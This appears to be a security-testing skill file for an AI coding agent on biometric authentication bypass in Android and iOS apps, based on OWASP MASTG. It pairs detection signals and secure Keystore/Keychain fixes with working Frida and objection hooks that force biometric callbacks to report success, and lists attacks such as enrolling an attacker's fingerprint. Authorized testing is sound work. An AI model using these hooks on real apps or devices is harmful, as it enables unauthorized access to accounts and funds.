---
name: mobile-auth-bypass
description: >
  Detects authentication and biometric bypass vulnerabilities in mobile apps (Android/iOS). Trigger on:
  BiometricPrompt, LocalAuthentication, LAContext, evaluatePolicy, CryptoObject, Android Keystore,
  Secure Enclave, kSecAccessControlBiometryCurrentSet, userAuthenticationValidityDurationSeconds,
  confirmCredentials, biometric fallback, PIN bypass, passive authentication, enrolled biometrics detection,
  Frida hook auth, jailbreak bypass, TouchID, FaceID, fingerprint. Covers MASVS-AUTH-1/2/3.
license: MIT
compatibility: Designed for Claude Code. Frida, objection, jadx, apktool, Burp Suite recommended.
metadata:
  category: mobile
  version: "0.1"
  source: https://mas.owasp.org/MASTG/
  source_types: framework
  masvs: MASVS-AUTH-1, MASVS-AUTH-2, MASVS-AUTH-3
---

# Mobile Authentication Bypass

## What Is Broken and Why

Mobile authentication is broken when the authentication check is event-driven (callback-only) rather than cryptographically bound to a Keystore/Secure Enclave key. An app that calls `BiometricPrompt` / `LAContext.evaluatePolicy()` and then checks a boolean `success` return can be bypassed by hooking the callback with Frida and forcing `true`. Truly secure biometric auth requires a `CryptoObject` (Android) or `SecAccessControl` with biometry binding (iOS) — without this, the biometric check has no cryptographic consequence and can be bypassed at the application layer.

## Key Signals

- `BiometricPrompt` used without a `CryptoObject` parameter (event-only, not key-bound)
- `LAContext.evaluatePolicy(_:localizedReason:reply:)` with no Keychain operation tied to auth
- `userAuthenticationValidityDurationSeconds > 0` with large values (minutes/hours)
- No `kSecAccessControlBiometryCurrentSet` flag — new enrollments silently unlock Keychain items
- `setUserAuthenticationRequired(false)` on a Keystore key intended for biometric-gated operations
- Fallback path (device PIN) bypasses Keystore binding constraints
- `onAuthenticationSucceeded` callback contains business logic without using `cryptoObject.cipher`

## Methodology

**Android:**
1. Decompile APK — search for `BiometricPrompt`, `FingerprintManager`, `KeyguardManager`
2. Check `BiometricPrompt.authenticate()` call: does it pass a `CryptoObject`?
3. If no `CryptoObject` → callback-only auth → hookable with Frida
4. Check Keystore key spec: `setUserAuthenticationRequired(true)` and `setInvalidatedByBiometricEnrollment(true)`
5. Check `userAuthenticationValidityDurationSeconds`: 0 = require auth on every use (correct); >0 = time-window (weaker)
6. Test fallback: trigger failed biometric → does PIN bypass the Keystore key requirement?
7. Frida hook: override `onAuthenticationSucceeded` to fire without user touching sensor

**iOS:**
1. Search IPA source for `LAContext`, `evaluatePolicy`, `kLAPolicyDeviceOwnerAuthenticationWithBiometrics`
2. Check Keychain item: `SecAccessControlCreateWithFlags` with `.biometryCurrentSet` or `.userPresence`?
3. If auth is event-only (just checks LAContext result, no Keychain op) → bypass with Frida
4. Verify `evaluatedPolicyDomainState` is checked on launch to detect enrollment changes
5. Frida: hook `LAContext.evaluatePolicy` reply block, force `error=nil` to simulate success

## Payloads & Tools

```js
// Frida — Android: bypass BiometricPrompt (event-only auth)
Java.perform(function() {
  var BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
  BiometricPrompt.onAuthenticationFailed.implementation = function() {
    this.onAuthenticationSucceeded(Java.use(
      "androidx.biometric.BiometricPrompt$AuthenticationResult").$new(null, 1));
  };
});
```

```js
// Frida — iOS: bypass LAContext evaluatePolicy
var LAContext = ObjC.classes.LAContext;
var evaluatePolicy = LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(evaluatePolicy.implementation, {
  onEnter: function(args) {
    var replyBlock = new ObjC.Block(args[4]);
    replyBlock.implementation = function(success, error) {
      replyBlock.implementation(1, null); // force success
    };
  }
});
```

```bash
# objection — Android: bypass biometric
android hooking watch class_method \
  androidx.biometric.BiometricPrompt\$AuthenticationCallback.onAuthenticationSucceeded

# objection — iOS: bypass LAContext
ios jailbreak disable  # in some versions triggers auth bypass
```

## Bypass Techniques

- **Frida callback hook** — force `onAuthenticationSucceeded` / LAContext reply to return success without biometric
- **New enrollment attack** — add attacker's fingerprint to device if screen is accessible; app without `kSecAccessControlBiometryCurrentSet` doesn't detect enrollment change
- **Fallback escalation** — trigger lockout of biometrics to force PIN fallback, then bypass PIN check in app logic
- **Time-window key abuse** — if `userAuthenticationValidityDurationSeconds` is set to hours, re-use the authenticated key window after the user walked away
- **Root/jailbreak + memory patch** — on rooted devices, patch the auth result check directly in memory

## Exploitation Scenarios

**Scenario 1 — Frida Biometric Bypass (Android)**
Setup: Banking app uses `BiometricPrompt` without `CryptoObject`; success triggers fund transfer unlock in callback. → Trigger: Frida hooks `onAuthenticationSucceeded`, fires it without biometric. → Impact: Full access to transfer functionality without the user's fingerprint.

**Scenario 2 — New Enrollment Unlock (iOS)**
Setup: Vault app stores secret in Keychain with `.userPresence` access control (no `.biometryCurrentSet`). → Trigger: Attacker adds their fingerprint to victim's unlocked device settings. → Impact: Attacker's Touch ID unlocks the Keychain secret.

**Scenario 3 — Validity Duration Abuse (Android)**
Setup: App sets `userAuthenticationValidityDurationSeconds(300)` (5 minutes). → Trigger: User authenticates once; attacker immediately uses the device. → Impact: Keystore key operations succeed for 5 minutes without additional auth.

## False Positives

- `BiometricPrompt` with `CryptoObject` — properly bound, not bypassable via callback hook
- Keychain items with `kSecAccessControlBiometryCurrentSet` — enrollment change invalidates access
- Auth bypass succeeds in debug/test build but not in production (release build strips debug flags)
- `evaluatePolicy` result is only used for UX (greyed-out UI), not for actual secret release

## Fix Patterns

```kotlin
// Android — key-bound biometric (correct)
val keyStore = KeyStore.getInstance("AndroidKeyStore")
val keyGen = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore")
keyGen.init(KeyGenParameterSpec.Builder("bioKey", KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)
    .setUserAuthenticationRequired(true)
    .setUserAuthenticationParameters(0, KeyProperties.AUTH_BIOMETRIC_STRONG) // 0 = per-use
    .setInvalidatedByBiometricEnrollment(true)
    .build())
// Pass CryptoObject to BiometricPrompt.authenticate()
```

```swift
// iOS — Keychain bound to biometry set (correct)
let access = SecAccessControlCreateWithFlags(nil,
    kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
    [.biometryCurrentSet], nil)!
// Any new enrollment invalidates this Keychain item
```

## Related Skills

[[auth-bypass]] on the web covers the same conceptual space — client-supplied flags and callback-only checks — but in a mobile runtime context. [[mobile-weak-crypto]] enables auth bypass when biometric auth is event-only rather than key-bound: without a `CryptoObject`, there is no cryptographic consequence to the biometric check. [[mobile-resilience]] controls like root/jailbreak detection are a prerequisite defense — Frida-based auth bypass requires an attached debugger or instrumentation framework that resilience controls are designed to detect.
